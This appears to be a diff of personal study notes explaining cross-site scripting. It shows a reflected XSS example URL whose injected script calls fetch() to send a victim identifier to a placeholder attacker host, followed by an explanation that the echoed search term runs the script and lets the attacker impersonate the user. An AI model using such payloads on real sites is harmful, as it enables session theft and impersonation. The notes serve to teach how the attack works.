@@ -14,6 +14,8 @@ https://www.mywebsite.com/store/search?sneakers=Nike&size=<script>
     fetch("HACKERSITE.com/victimID/"+jsId);
 })()
 </script>
+If the site then says "You searched for: <whatever is in request>" that would then execute the javscript
+and then the hacker could do whatever and impersonate you. 
 
 Then I'd talk about Stored XSS:
 If I wanted to make an example I'd follow this video:
